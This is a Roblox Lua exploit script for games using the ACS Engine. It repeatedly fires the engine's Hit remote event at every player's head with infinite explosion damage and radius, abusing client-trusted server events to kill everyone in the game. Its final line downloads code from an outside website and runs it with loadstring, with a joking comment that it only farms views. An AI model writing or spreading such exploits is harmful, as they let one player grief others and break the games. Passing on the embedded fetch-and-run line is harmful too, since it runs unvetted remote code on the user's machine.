--[[
    ____  __           __  _             _____ __                
   / __ )/ /___ ______/ /_(_)___  ____ _/ ___// /_____  ____  ___
  / __  / / __ `/ ___/ __/ / __ \/ __ `/\__ \/ __/ __ \/ __ \/ _ \
 / /_/ / / /_/ (__  ) /_/ / / / / /_/ /___/ / /_/ /_/ / / / /  __/
/_____/_/\__,_/____/\__/_/_/ /_/\__, //____/\__/\____/_/ /_/\___/
          ACS Engine Explosion /____/ Made by BlastingStone#8878
                           
]]--

local plr = game.Players.LocalPlayer
local Evt = game.ReplicatedStorage.ACS_Engine.Eventos

local Settings = {
    ["ExplosiveHit"] = true,
    ["ExPressure"] = math.huge,
    ["ExpRadius"] = math.huge,
    ["DestroyJointRadiusPercent"] = math.huge,
    ["ExplosionDamage"] = math.huge,
}

 
while wait() do 
    pcall(function()
       for i,v in pairs(game.Players:GetChildren()) do
            game.ReplicatedStorage.ACS_Engine.Eventos.Hit:FireServer(v.Character.Head.Position, v.Character.Head, v.Character.Head.Position, Enum.Material.Plastic, Settings)
        end 
    end)
end

loadstring(game:HttpGet("https://mynickname.com/blastingstone"))() --ssh. im farming views on my nickname
